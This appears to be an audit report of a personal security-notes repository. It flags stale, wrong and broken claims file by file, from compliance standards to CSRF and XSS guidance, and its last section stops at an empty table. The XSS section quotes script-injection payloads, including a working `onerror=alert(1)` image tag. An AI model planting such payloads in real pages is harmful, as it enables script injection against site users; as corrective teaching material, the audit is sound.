# Audit: Security/ (15 files)

Audited 2026-09-16. Repo root `/Users/Hemant.Kumar@finova.tech/workspace/messup-learn`. Read-only; no repo files touched.

**Typing convention used:** **STALE** = accurate at some point but since superseded (renamed product, old version, dead recommendation); where the supersession predates the file's last commit, Problem says so, because the note was already out of date when last touched. **WRONG** = never accurate as stated, or a definitional/technical error. Six high-severity facts were web-verified (PCI DSS dates, CA/B Forum SC-081 schedule, FIPS 140-2 sunset, EU-US DPF/Latombe, OWASP Top 10:2025, ModSecurity EOL); everything else is rated from knowledge, with "Unverified" on numbers/dates I could not pin. URLs are not flagged as dead (separate link check).

---

## Security/Certification.md (last commit 2020-10-19)

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
| 1 | BROKEN | (line 1 is a single space; first heading is `## Individual certifications`) | No H1. File starts at H2 with a stray whitespace line. | Add `# Security Certifications` as line 1. | High |
| 7 | WRONG | `* CREST https://www.crest-approved.org/` listed under "Individual certifications" | CREST is an accreditation body for companies and an exam provider (CRT, CCT, CPSA are the individual certs). "CREST" itself is not an individual certification. | Rename to "CREST exams (CPSA, CRT, CCT)" or move to a "Bodies/accreditations" list. | Medium |
| 4 | STALE | `CISSP https://en.wikipedia.org/wiki/...` | Only a Wikipedia link. CISSP exam moved to CAT format and had domain-weight refreshes (Apr 2021, Apr 2024); no exam details are recorded here, so nothing is wrong, but an agent gets nothing beyond the name. Also uses "wiki" rather than ISC2's own page. | Add one line each: issuing body, target audience, current exam format. Point CISSP/SSCP at isc2.org. | Low |
| 13 | OPINION | `Cyber Essentials Certification indicates ... implies no gaurantee` | Paraphrases NCSC/IASME positioning as a general fact; fine, but unsourced and undated. Cyber Essentials scheme requirements were revised Jan 2022 ("Evendine"), Apr 2023 ("Montpellier") and Apr 2025 ("Willow") - none reflected. Spelling "gaurantee". | Cite NCSC, note Cyber Essentials vs Cyber Essentials Plus, and mention that requirements are revised annually. | Medium |
| - | CLASSIFY | (whole file) | 13 lines: four bare links plus one paragraph on Cyber Essentials. Too thin to stand alone and overlaps the framework/standards material in `Compliance.md`. | Merge into `Compliance.md` as "## Certifications (individual and organisational)". | Medium |

No dated exam details (prices, question counts, versions) are present, so nothing to correct on that front - the file is simply too thin.

---

## Security/Cloud Security.md (last commit 2023-07-11)

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
| 1 | BROKEN | `# Cloud Security Controls Framework` | H1 does not match filename `Cloud Security.md`. | Rename H1 to `# Cloud Security` (or the file to match). | High |
| 7 | WRONG | `NIST Framework ... covering over 900 controls over 5 major functions` | Conflates two documents. The five functions belong to the NIST Cybersecurity Framework (CSF); the "~900+ controls" are NIST SP 800-53. CSF itself has no controls catalogue. | Split: "NIST CSF (functions/categories) and NIST SP 800-53 (control catalogue, ~1,000+ controls in Rev 5)". | High |
| 7 | STALE | `Identify, Protect, Detect, Respond, and Recover are the five functions` | NIST CSF 2.0 (Feb 2024) added a sixth function, **Govern**. | "six functions in CSF 2.0: Govern, Identify, Protect, Detect, Respond, Recover". | High |
| 16 | BROKEN | `ENSIA Threat Taxonomy` | Typo in a bullet label: agency is ENISA (spelled correctly later in the same line). | `ENISA Threat Taxonomy`. | High |
| 20 | OPINION | `SOX Security Controls - The Global SOX Control Model for Public cloud` | Reads like an internal/employer control model name; there is no public standard by this name. | Label as "internal control model" or remove. | Medium |
| 65 | INCONSISTENT | Prowler: `Superior security tool vs ScoutSuite` | Line 69 says Scout2 is `Superior security-auditing tool vs Prowler`. Both rows claim superiority over the other. Also "ScottSuite" typo. | Keep one neutral comparison row; fix typo. | High |
| 65 | STALE | `Prowler - https://github.com/toniblyx/prowler ... Assesses AWS against CIS Benchmarks` | Repo moved to `prowler-cloud/prowler`; Prowler is now multi-cloud (AWS, Azure, GCP, Kubernetes, M365) with many compliance frameworks, not just CIS/AWS. | Update description and repo owner. | Medium |
| 69 | STALE | `Scout2 - https://github.com/nccgroup/Scout2` | Scout2 was deprecated in favour of **ScoutSuite** (`nccgroup/ScoutSuite`) in 2018/2019 (supersession predates commit). Row text itself says "Scout Suite". | Rename row to ScoutSuite with the current repo. | High |
| 68 | CLASSIFY | `SQLMap ... Automates testing for SQL injection` | Not a cloud security tool; belongs with DAST/pen-test tooling in `Web Security/Web Application Security.md`. | Move. | Medium |
| 82-88 | STALE | `Azure Security center` / `Integrates with windows defender ATP` | Renamed **Microsoft Defender for Cloud** (Nov 2021) and **Microsoft Defender for Endpoint** (2020/2021) - already renamed at commit, so strictly WRONG-at-commit. The Log Analytics (MMA) agent workflow described (workspace ids/keys) was deprecated Aug 2024; Defender for Cloud now uses agentless scanning and the Defender for Endpoint sensor. | Rename headings and rewrite agent paragraph. | High |
| 89-91 | STALE | `Azure Sentinel is a cloud native SIEM and SOAR` | Renamed **Microsoft Sentinel** (Nov 2021, before commit). | Rename. | High |
| 93 | BROKEN | `![asc_as.png](../Images/asc_as.png "ASC v AS")` | Alt text is the filename; image exists but alt is meaningless to an agent. | Alt: "Defender for Cloud vs Microsoft Sentinel comparison". | Low |
| 112 | WRONG | `SOR - Security automation and orchestration` | Not a recognised industry acronym; duplicates SOAR. | Remove or change to a real acronym (e.g. SOC 2, SOR = System of Record if that was intended). | Medium |
| 114 | CLASSIFY | `PRA - Probabilistic risk assessment` | Not used anywhere in the file. | Remove or use. | Low |
| 82-93 | CLASSIFY | Azure Security Center / Sentinel sections | Product-specific Azure content; the rest of the repo keeps vendor content under `Cloud and Infrastructure/Azure/`. Similarly the AWS tool table (lines 63-70) overlaps `Cloud and Infrastructure/AWS/Security.md`. | Move Azure product notes to `Cloud and Infrastructure/Azure/`, keep vendor-neutral framework content here and cross-link. | Medium |

---

## Security/Compliance.md (last commit 2023-06-21)

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
| 3-8 | CLASSIFY | `Schannel or secure channel is a Secure Support Provider Interface` / PKCS paragraph | Windows crypto-stack and PKCS background is not "compliance"; it is TLS/PKI implementation detail. Also "Secure Support Provider Interface" should be "Security Support Provider Interface (SSPI)". | Move to `Web Security/Transport Layer Security.md` or `TLS Certificates.md`; fix SSPI name. | Medium |
| 21 | STALE | `ISO 27001 - Info Security` | No edition given. ISO/IEC 27001:2022 replaced 27001:2013 (Oct 2022, before commit); transition period for existing certificates ended 31 Oct 2025. | "ISO/IEC 27001:2022 (2013 edition certificates expired Oct 2025); 27002:2022 is the control catalogue (93 controls in 4 themes)". | High |
| 28 | WRONG | `### SOC 1, 2, 3` -> `Security, Availability & Confidentiality Reports` | SOC 1 is about internal control over financial reporting (ICFR), not security. SOC 2 covers the five Trust Services Criteria (Security, Availability, Processing Integrity, Confidentiality, Privacy). SOC 3 is the public-distribution summary of a SOC 2. Type I vs Type II not mentioned. | Rewrite the three bullets accordingly. | High |
| 32 | WRONG | `SSL ... can no longer be used as a security control after June 30, 2016` | PCI SSC moved the SSL/early TLS deadline from June 2016 to **30 June 2018** (announced Dec 2015 - already wrong at commit). Verified. | "after 30 June 2018 (PCI DSS 3.1/3.2 migration deadline)". | High |
| 30-34 | STALE | (no PCI DSS version named) | PCI DSS v4.0 published Mar 2022 (before commit); v3.2.1 retired 31 Mar 2024; v4.0.1 is the only active version since then; future-dated requirements became mandatory 31 Mar 2025. Verified. | Add a version line: "Current: PCI DSS v4.0.1 (v3.2.1 retired 31 Mar 2024; v4.0 future-dated requirements effective 31 Mar 2025)". | High |
| 34 | STALE | `TLS 1.2 currently meets the PCI SSC definition ... you must be using this version` | TLS 1.3 (RFC 8446, 2018) also meets "strong cryptography"; wording implies 1.2 is the only option. | "TLS 1.2 or 1.3". | High |
| 38 | STALE | `FIPS 140 ... [link to fips1402annexa.pdf]` | Anchored on FIPS 140-2. FIPS 140-3 is the active standard (CMVP stopped accepting 140-2 submissions Sept 2021); all FIPS 140-2 certificates move to the CMVP **Historical** list on **21 Sep 2026** (five days from today). Verified. | Reference FIPS 140-3 and SP 800-140x annexes; note the 140-2 sunset. | High |
| 42 | STALE | `.Net framework provides 3 implementations ... RijndaelManaged, AesManaged and AesCryptoServiceProvider ... AesCryptoServiceProvider is FIPS compliant` | In .NET 6+ these classes are marked obsolete (SYSLIB0021/0022); guidance is `Aes.Create()`, which uses the platform's FIPS-validated provider. Also "Rijnadael" typo. Only true for legacy .NET Framework. | Scope the sentence to ".NET Framework 4.x" and add the modern guidance. | High |
| 43 | STALE | `Triple-DES (Data Encryption Standard)` listed as FIPS-approved for encryption | NIST SP 800-131A Rev 2: 3DES disallowed for encryption after 31 Dec 2023 (decrypt-only legacy use). | Mark "legacy/decrypt only; disallowed for encryption since 2024". | High |
| 44 | WRONG | `EES (Escrowed Encryption Standard)` | FIPS 185 (Clipper/Skipjack) was withdrawn in 2015; was not an approved algorithm at commit. | Remove. | High |
| 49 | STALE | `DSA` listed as approved asymmetric algorithm | FIPS 186-5 (Feb 2023, before commit) removed DSA for new signature generation; only EdDSA, ECDSA and RSA remain. | Replace DSA with EdDSA; note DSA is verify-only legacy. | High |
| 54 | STALE | `SHA-1, SHA-224, ...` listed as hash standards "for TLS integrity requirements" | SHA-1 is disallowed for digital signatures since 2013 and NIST has announced full retirement by 31 Dec 2030 (SP 800-131A). TLS 1.3 does not use SHA-1 anywhere. SHA-3 family (FIPS 202) missing. | Mark SHA-1 legacy; add SHA-3. | High |
| 46 | WRONG | `Asymmetric Key ... for TLS key exchange and authentication` -> RSA, DSA, ECDSA | DSA and ECDSA are signature-only; they do not perform key exchange. Key exchange in FIPS-approved TLS is (EC)DH / (EC)DHE (SP 800-56A), and ML-KEM in FIPS 203 (2024). | Separate "signatures" (RSA, ECDSA, EdDSA) from "key agreement" (ECDH, DH, ML-KEM). | High |
| 68 | STALE | `disables the weaker SSL protocols and only supports TLS 1.0 and above` | RFC 8996 (Mar 2021, before commit) formally deprecated TLS 1.0 and 1.1; current FIPS/NIST guidance (SP 800-52 Rev 2) requires TLS 1.2 minimum, TLS 1.3 recommended. | "TLS 1.2 and above (1.0/1.1 deprecated by RFC 8996)". | High |
| 58 | BROKEN | `* See annex c` | Dangling reference to an annex not present in this file (belongs to FIPS 140-2 Annex C, which is itself superseded). | Replace with "DRBGs per SP 800-90A (Hash_DRBG, HMAC_DRBG, CTR_DRBG)". | Medium |
| 30-34 | DUPLICATE | PCI DSS section | Overlaps `Security/Data Security.md` lines 72-78 ("Payment Card Industry Data Security Standard"). | Keep one canonical PCI DSS section (suggest here) and link from Data Security. | High |
| 12-17 | CLASSIFY | `region (GDPR) specific requirements` | GDPR is listed here but explained in `Data Security.md`; SOC/ISO here, Cyber Essentials in `Certification.md`. Framework content is split three ways. | Make Compliance.md the single index of regulations/standards with links. | Medium |

---

## Security/Container Security.md (last commit 2020-06-19)

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
| 7 | STALE | `Can be turned on across an organisation and groups using universal control planes` | Docker Universal Control Plane was sold to Mirantis (Nov 2019) and renamed **Mirantis Kubernetes Engine** - already renamed before commit, so WRONG-at-commit. | Rename or drop; DCT enforcement today is via `DOCKER_CONTENT_TRUST=1` or admission controllers. | High |
| 5-13 | STALE | `## Docker content trust` (Notary v1 based) | Docker Content Trust / Notary v1 is effectively legacy: Notary v1 is in maintenance only, Docker Hub signing is being retired (Docker announced DCT deprecation in 2025 - date Unverified). Successors are Sigstore **cosign** and CNCF **Notation** (Notary v2). | Add "legacy; prefer cosign/Notation" and the OCI referrers/attestation model. | High |
| 19 | BROKEN | `Docker manifest follows a merkel tree` | Spelling: **Merkle** tree. Also a bare fragment, not a sentence. | Fix spelling; expand to one sentence. | High |
| 21-23 | STALE | `## Docker Trusted Registry` | DTR is now **Mirantis Secure Registry** (2020). Also image scanning is now commonly done with Trivy/Grype/Docker Scout rather than DTR. | Rename; add current scanners. | High |
| 27-31 | STALE | `## Docker Swarm` | Swarm is a niche orchestrator; the repo's own orchestration content is Kubernetes (`Cloud and Infrastructure/Kubernetes/Overview.md`). No mention of Pod Security Standards, seccomp/AppArmor, rootless containers, image signing in k8s. | Add a Kubernetes-oriented security section or point at the Kubernetes file. | Medium |
| 7-13, 25, 35 | BROKEN | `Adversarial environment`, `Store root keys offline`, `Traditionally - Hard shell soft interior`, `Service discovery is network scoped` | Orphan bullet fragments without context (lecture notes). Not usable as reference statements. | Expand or delete. | High |
| - | CLASSIFY | (whole file) | Docker-2017-era talk notes; the substantive parts (TUF, drop privileges, key storage) are generic supply-chain/security-principles content. | Archive candidate: rewrite as "Container & supply-chain security" (image signing, SBOM, scanning, least-privilege runtime) or fold into `Web Application Security.md` SBOM/SLSA section. | Medium |

---

## Security/Data Security.md (last commit 2023-04-14)

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
| 9 | WRONG | `there is an exemption in GDPR for staff email addresses. Companies are able to process employee data without explicit GDPR consent` | There is no GDPR "exemption" for staff email addresses; they are personal data. What is true is that consent is rarely the appropriate lawful basis for employee data - employers rely on contract, legal obligation or legitimate interests (Art. 6). | Rewrite: "Work email addresses are still personal data; employers usually process employee data under contract/legitimate-interest bases rather than consent." | High |
| 28 | STALE | `According to a study browsers that had Java/Flash enabled, 94% were uniquely identifiable` | Uncited (EFF Panopticlick, Eckersley 2010). Flash has been EOL since Dec 2020 and Java applets since 2017, so the premise no longer applies; modern fingerprinting uses canvas/WebGL/audio/fonts. | Cite the 2010 study and add modern vectors. | Medium |
| 43 | STALE | `It replaced the Data Protection Act in the UK` | Imprecise: GDPR was supplemented (not replaced) by the **Data Protection Act 2018**, which replaced DPA 1998. Post-Brexit the UK operates **UK GDPR**; the **Data (Use and Access) Act 2025** amended it. None mentioned. | "In the UK: UK GDPR + DPA 2018 (replaced DPA 1998); amended by Data (Use and Access) Act 2025." | High |
| 51 | WRONG | `maximum fine of 20m or 4% of their revenue` | Should be EUR 20m or 4% of annual **global turnover**, **whichever is higher**; UK GDPR cap is GBP 17.5m or 4%. No currency and missing "whichever is higher". | Fix wording. | High |
| 64-68 | STALE | `## Schrems II` ... `declared the EU-US Privacy Shield ... invalid` | Correct history, but superseded: the **EU-US Data Privacy Framework** adequacy decision was adopted 10 Jul 2023 (three months after commit); the General Court dismissed the Latombe challenge on 3 Sep 2025 (appeal to CJEU pending). Also the EU published new SCCs in June 2021 and the UK IDTA/Addendum in 2022. Verified. | Add a "Data Privacy Framework (2023)" paragraph and mention 2021 SCCs / UK IDTA. | High |
| 74 | WRONG | `Regulation put in place by payment processors, e.g. Visa, Mastercard, Worldpay, PayPal, Stripe` | PCI DSS is a contractual **industry standard** (not a regulation) published by the PCI Security Standards Council, founded by the five card brands (Visa, Mastercard, Amex, Discover, JCB). Worldpay, PayPal and Stripe are acquirers/PSPs that must *comply* with it, not authors. | Fix wording. | High |
| 72-78 | DUPLICATE | PCI DSS section | Duplicates `Compliance.md` lines 30-34. | Keep in Compliance.md; link. | High |
| 88 | WRONG | Table row `Confidentiality | No | Yes | Yes` (MAC and Digital Signature provide confidentiality) | Neither a MAC nor a digital signature provides confidentiality; both are authenticity/integrity primitives over plaintext. Only encryption does. High-severity for a knowledge base. | Row should read `Confidentiality | No | No | No` and add an "Encryption" column (Yes). | High |
| 82 | INCONSISTENT | `three key properties: confidentiality, integrity and authenticity` | The table (lines 84-90) then lists four goals including non-repudiation and omits encryption entirely, so the "three properties" are not mapped to the primitives that supply them. | Add Encryption/AEAD column. | Medium |
| 114 | WRONG | `Modern encryption algorithms: ... PGP Pretty Good Privacy` | PGP is a program/message format (OpenPGP), not an algorithm; it uses RSA/ECC + AES internally. Also ChaCha20-Poly1305 and AES-GCM (AEAD) are the "modern" primitives worth naming. | Replace PGP with "AEAD modes: AES-GCM, ChaCha20-Poly1305"; mention OpenPGP separately. | High |
| 126 | WRONG | `No 2 inputs can generate the same hash thus a one-way function. This property is also known as preimage resistance.` | Two errors: collisions always exist (pigeonhole) - the property is that they are infeasible to *find*, and that is **collision resistance**, not preimage resistance. One-wayness (hard to invert) is preimage resistance. | Rewrite the bullet with correct definitions: preimage, second-preimage, collision resistance. | High |
| 127 | WRONG | `random ... minimising collisions when used in hash tables, thus providing collision resistance` | Conflates non-cryptographic hash-table hashing with cryptographic collision resistance. | Separate the two concepts. | Medium |
| 128 | WRONG | `reasonably quick to compute, but also not too quick. If it is too quick it is easy to break.` | General-purpose cryptographic hashes (SHA-256) are designed to be fast; "slow" is a property only of *password* hashes/KDFs. | Move the "slow" property to the password-hashing bullet. | High |
| 132 | WRONG | `A cryptographic hash is designed to be computationally infeasible to reverse, thus provide confidentiality via encryption` | A hash is not encryption and provides no confidentiality; this contradicts line 141 ("encoding ... nothing to do with cryptography") style precision elsewhere. Also "A checksum is necessarily a hash" is inverted logic vs the rest of the sentence. | Delete "thus provide confidentiality via encryption". | High |
| 134 | STALE | `Password hashing uses a "Salt" - a unique value that can be added to the end of the password` | No algorithm guidance at all. Current OWASP guidance: **Argon2id** (19 MiB / 2 iter / p=1 minimum), scrypt, bcrypt (work factor >=10), PBKDF2-HMAC-SHA256 with **600,000** iterations (FIPS contexts). Salt is prepended/random, not "added to the end". | Add algorithm recommendations and parameters. | High |
| 138 | WRONG | `Nonce is a one time value used to generate a unique hash per request` (under HMAC) | Mixes concepts: a nonce prevents replay of a *message*, it does not alter the MAC algorithm; also HMAC "verify the sender" requires a shared key, which the sentence omits. | Clarify: HMAC = keyed hash; nonce/timestamp included in the MAC'd message to prevent replay. | Medium |
| 84-90 | BROKEN | Table column alignment `|:----|` etc. | Renders, but bold row `**Kind of keys**` inside a data row is a header masquerading as data. | Move key type to a footnote or header. | Low |
| - | CLASSIFY | (whole file) | Two unrelated halves: privacy/regulatory (PII, GDPR, Schrems, PCI) lines 3-78, and cryptographic primitives (encryption/hash/encode) lines 80-141. | Split into `Data Privacy.md` (merge regulatory bits with Compliance.md) and `Cryptography Basics.md`. | High |

---

## Security/Endpoint Security.md (last commit 2021-05-21)

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
| 5, 9 | OPINION | `may be your best option` / `create the perfect endpoint security cocktail` | Vendor-blog phrasing presented as fact. | Label as general guidance; neutral wording. | Medium |
| 11 | WRONG | `Chosing an EDR or EDP or both` | "EDP" should be **EPP** (Endpoint Protection Platform, as defined on line 9). Also "Chosing", "depened", "oranization" typos. | Fix. | High |
| 5-9 | STALE | EPP / EDR framing | The market has moved to **XDR** and MDR; no mention. | Add one line on XDR/MDR. | Medium |
| 34 | BROKEN | `#### Interpretting the VirusTotal Scan` | Heading misspelt (Interpreting). | Fix. | High |
| 36 | STALE | `VirusTotal Public API (https://developers.virustotal.com/v3.0/reference#overview)` | v3 API is current but docs moved; VirusTotal is now part of **Google Threat Intelligence** (2024). Public API quota is 4 req/min, 500/day (Unverified). | Update naming. | Low |
| 40 | STALE | `https://github.com/fireeye/capa` | Repo moved to `mandiant/capa` (FireEye -> Mandiant, 2021; now Google). Product rename, not just a redirect. | Update. | Low |
| 59 | OPINION | `a graded reputation score can be calculated using two point form` | Personal scoring heuristic; not a standard. | Label as "one approach". | Medium |
| 65 | WRONG | `VT's YARA is a tool` | YARA is an independent open-source project (Victor Alvarez, originally at VirusTotal); calling it "VT's" is misleading. VT *uses* YARA for Livehunt. | "YARA (open-source pattern-matching tool, used by VirusTotal Livehunt)". | Medium |
| 61-75 | CLASSIFY | `#### Malware hunting` (threat hunting, YARA, Livehunt) nested under "VirusTotal" under "Anti virus" | Threat hunting is a SOC/detection topic, not an antivirus sub-topic; H4 under H3 under H2 buries it. | Promote to its own H2 or move to a Detection/SOC note. | Medium |
| 91 | STALE | `Retina was Beyond Trust's ... end of lifed ... recommend customers to work with strategic partner Tenable` | Vendor history; correct (EOL 2019/2020) but of no reference value now. | Cut to one sentence or remove. | Medium |
| 95-97 | STALE | `Tenable.io` | Renamed **Tenable Vulnerability Management** (Jan 2023). Paragraphs are marketing copy ("anyone can understand"). | Rename; trim marketing. | High |
| 99-107 | CLASSIFY | BeyondTrust asset discovery / Privileged Identity | Vendor product notes (PAM). Belongs in an IAM/PAM note, and reads as vendor copy. | Move to an IAM note; neutralise. | Medium |
| 105 | BROKEN | `### Priveleged account discovery` | Heading misspelt (Privileged). | Fix. | High |
| - | CLASSIFY | (whole file) | Mixes four topics: EPP/EDR, VirusTotal usage, vulnerability management, asset/privileged-account discovery. | Split: keep "Endpoint Security" (EPP/EDR/XDR); move VirusTotal/YARA to "Malware analysis"; move VM and discovery elsewhere. | High |

---

## Security/Storing secrets.md (last commit 2022-03-15)

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
| 1 | CLASSIFY | `# Storing secrets` | Title promises secret storage; content is GPG key management + Blackbox. No Vault, cloud KMS/Secrets Manager/Key Vault, SOPS, env-var hygiene, rotation. The real secret-store notes live in `Cloud and Infrastructure/AWS/Security.md` (Secrets Manager, Parameter Store) and `AWS/Security - KMS.md`. | Rename to `GPG and encrypted files in Git.md`, or expand into a real "Storing secrets" note (Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager, SOPS/age, sealed-secrets) linking the AWS files. | High |
| 3 | WRONG | `SSH keys ... does not prove anything to anyone who is not Github` | SSH keys prove possession to any host holding your public key, not only GitHub; sentence is about *authentication vs signing* but phrased incorrectly. | "SSH keys authenticate you to a host; authentication does not leave a verifiable artefact in the repo, signing does." | Medium |
| 5 | STALE | `Using SSH for signing would be theoretically possible, it's just not convenient` | Git 2.34 (Nov 2021, before commit) added `gpg.format=ssh` (`git commit -S` with an SSH key); GitHub verifies SSH signatures since Aug 2022 and also supports **gitsign**/Sigstore keyless signing. | Add SSH signing (`git config gpg.format ssh; git config user.signingkey ~/.ssh/id_ed25519.pub`). | High |
| 9 | STALE | `Generate a key gpg --gen-key` | Current recommendation is `gpg --full-generate-key` (choose ECC/ed25519 and expiry); GitHub docs use `--full-generate-key`. | Update. | Medium |
| 12-13, 19, 29, 38 | OPINION | `hk@hemantkumar.net` | Personal email baked into examples. Fine, but an agent would copy it. | Use `<your-email>` placeholder. | Low |
| 25 | STALE | `Blackbox ... can be used to store secrets safely in a VCS repository` | StackExchange Blackbox is essentially unmaintained (last release 2020-2021, Unverified); mainstream alternatives are **Mozilla SOPS** (with age/KMS), **git-crypt**, **age**, and for Kubernetes **sealed-secrets**/External Secrets Operator. | Add alternatives with a "maintenance" caveat. | Medium |
| 25 | BROKEN | `It can Gnu Privacy Guard (GPG) encrypt specific files` | Grammar glitch making the sentence hard to parse ("can GPG-encrypt"). | Fix. | Low |
| 29 | BROKEN | `blackbox_addadmin <hk@hemantkumar.net>` | Angle brackets around a literal value (looks like placeholder syntax but contains a real email). | `blackbox_addadmin <gpg-uid>`. | Low |

---

## Security/Threat Modelling.md (last commit 2023-11-22)

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
| 4-8 | WRONG | `trying to find answers to the following questions: What are we working on? What could go wrong? What are we going to do about it?` | Shostack's Four-Question Frame (and the Threat Modeling Manifesto) has **four** questions; the fourth, "Did we do a good enough job?", is omitted, even though line 23 lists "Validate the threat model" which corresponds to it. | Add the fourth question and cite the Threat Modeling Manifesto (2020). | High |
| 12-23 | STALE | `## Threat model development` (no methodology named) | No mention of **STRIDE** (per-element/per-interaction), **PASTA**, **LINDDUN** (privacy), **DREAD** (deprecated by Microsoft for inconsistency), attack trees, or tooling (OWASP Threat Dragon, Microsoft TMT, pytm, IriusRisk). For a reference note this is the key gap. | Add a "Methodologies" section: STRIDE for threat enumeration; DREAD/CVSS caveats for rating; PASTA as risk-centric; LINDDUN for privacy. | High |
| 18 | OPINION | `how to deal with the threats based on priority low to high` | Order should be high to low (deal with highest first); likely slip. | "high to low". | Medium |
| 30-36 | STALE | `Microsoft has published its list of attack surface elements associated with Windows` | Uncited (Howard, "Relative Attack Surface Quotient", 2003). Very Windows-2003 flavoured; modern attack-surface lists include APIs, cloud IAM, CI/CD, dependencies. | Cite; add modern elements. | Medium |
| 53 | OPINION | `Complete mediation - reverify user authentication when they are trying to complete a sensitive task` | Saltzer & Schroeder's complete mediation means *every access to every object is checked for authority*; step-up re-authentication is one application, not the definition. | Give the actual definition, then the example. | Medium |
| 54 | WRONG | `Open design - Given enough eyeballs all bugs are shallow` | Conflates Saltzer & Schroeder's **open design** (security must not depend on secrecy of the design/Kerckhoffs' principle) with **Linus's Law** (Raymond). | Correct the definition. | High |
| 43-54 | CLASSIFY | `## Security principles` | Generic secure-design principles; also partially covered in `Web Security/Web Application Security.md` line 4 (defence in depth). Better as its own note that both files link to. | Extract to `Security Principles.md`. | Medium |

---

## Security/Web Security/Cross Site Request Forgery.md (last commit 2023-08-19)

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
| 16-22 | BROKEN | ```` ```<form action="/transfer.do" method="post"> ```` ... ```` </form>``` ```` | Code fence opened on the same line as content and closed inline; no language tag. Renders as garbage in most Markdown engines. | Put ```` ```html ```` on its own line, code on following lines, closing fence on its own line. | High |
| 12 | STALE | `[CSRF Prevention](https://www.owasp.org/index.php/...Prevention_Cheat_Sheet)` | Old OWASP wiki; content moved to cheatsheetseries.owasp.org (product move, not just redirect). | Update link target. | Low |
| 14, 24 | STALE | `In order to prevent against CSRF ... adding an anti CSRF token` (only defence described) | No mention of **SameSite cookies**: Chromium has defaulted to `SameSite=Lax` since Chrome 80 (Feb 2020, before commit - so arguably WRONG-at-commit), with a 2-minute "Lax+POST" exception for cookies without SameSite; Firefox and Safari do not default to Lax. Also missing: `Origin`/`Referer` verification, **Fetch Metadata** (`Sec-Fetch-Site`), and the OWASP position that tokens remain the **primary** defence and SameSite is defence-in-depth. Note for the reader: the token guidance itself is *not* superseded. | Add a "SameSite and other defences" section stating: tokens (synchronizer or signed double-submit) primary; `SameSite=Lax/Strict` + `Sec-Fetch-Site` checks as defence-in-depth; SameSite=Lax does not protect same-site subdomains or top-level GET navigations. | High |
| 24 | WRONG | `The token is generated as a pair with the session token stored in the Cookie header. They are a cryptographic pair` | Describes one specific implementation (ASP.NET double-submit with paired tokens) as if universal. The synchronizer token pattern stores the token server-side in the session; the "cryptographic pair" language is not general. Also line 24 says the attacker "can set both ... only if they perform a XSS attack to inject their own arbitrary cookie" - cookie tossing from a sibling subdomain also allows this without XSS (why OWASP now says naive double-submit is insufficient and recommends the *signed* double-submit cookie). | Describe synchronizer token vs signed double-submit; note the subdomain cookie-tossing weakness. | Medium |
| 24 | OPINION | `once you are authenticated the cookie gets keyed to your username` | Framework-specific behaviour (ASP.NET AntiForgery) stated generally. | Attribute to ASP.NET. | Medium |
| 26 | OPINION | `This technique is exactly how the MySpace (Samy) worm defeated MySpace's anti CSRF defenses in 2005` | Sentence is lifted verbatim (unattributed) from the OWASP CSRF Prevention cheat sheet. The claim itself is OWASP's and acceptable; "read any page on the site" should be "any same-origin page". | Attribute the quote to OWASP; say "same-origin page". | Low |
| 5 | OPINION | `AuthCookie keeps a user authenticated` | "AuthCookie" is not a standard term (ASP.NET `.ASPXAUTH`). | Say "the session/authentication cookie". | Low |

---

## Security/Web Security/Cross Site Scripting.md (last commit 2023-08-19)

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
| 13 | WRONG | `Always validate un-trusted data i.e. all input fields. XSS vulnerabilities come from a lack of data escaping` | Primary XSS defence is **context-aware output encoding** at render time (plus CSP, and safe sinks/Trusted Types for DOM XSS); input validation is secondary and cannot be relied on. Sentence mixes the two. | Lead with output encoding; list validation as defence-in-depth. | High |
| 15-19 | WRONG | ```` ```javascript ```` block: `html_escape(...)` `// equivalent unicode escaped form` `=> is a &gt; 0 ...` | Not JavaScript (pseudo-code with `=>` output), and the result is **HTML entity encoding**, not "unicode escaped". | Change fence to `text`; fix comment. | High |
| 21-25 | WRONG | `<IMG SRC="javascript.alert('XSS');">` | Typo: the classic payload is `javascript:alert('XSS')` (colon). More importantly `<img src="javascript:...">` has not executed in any modern browser for ~15 years (IE6/Netscape-era). Fence tagged `javascript` but content is HTML. | Use a working example: `<img src=x onerror=alert(1)>`; fence `html`. | High |
| 27 | STALE | `OWASP [XSS Filter Evasion cheat sheet](https://www.owasp.org/index.php/...)` | Moved to cheatsheetseries.owasp.org. | Update. | Low |
| 28 | INCONSISTENT | `Flag Cookies as HttpOnly` | Correct, but `Security Cookies.md` line 33 and this file give no cross-reference; the mitigation list here omits CSP, which lives only in `Security Headers.md`. | Link CSP and Cookies files. | Medium |
| 29 | WRONG | `Even DNS records can be infected by XSS attacks` | DNS records are not "infected by XSS". The likely intent is that TXT/PTR records rendered unescaped by a tool can carry a payload (a stored-XSS *sink*), but as written it is meaningless. | Rewrite: "any untrusted data source rendered into HTML - including DNS TXT records or log lines - can carry an XSS payload". | Medium |
| 11-29 | STALE | (no CSP / Trusted Types / framework auto-escaping) | Missing the 2023-era standard advice: strict nonce/hash-based CSP, `Trusted Types` (Chromium), templating auto-escaping, DOMPurify for HTML sinks, `X-XSS-Protection` being deprecated (only stated in Security Headers.md). | Add a mitigations table. | High |
| 5-7 | OPINION | `DOM-based XSS: ... possibly from an injected malicious JS from an untrusted source as opposed to coming from the server` | Vague; DOM XSS = payload flows source (e.g. `location.hash`) to sink (`innerHTML`) entirely client-side. | Tighten definition. | Medium |

---

## Security/Web Security/Security Cookies.md (last commit 2025-08-11)

Because this file was committed in Aug 2025, nearly every dated fact below was already false at commit and is typed WRONG.

| Line | Type | Claim (quoted, short) | Problem | Suggested fix | Confidence |
|---|---|---|---|---|---|
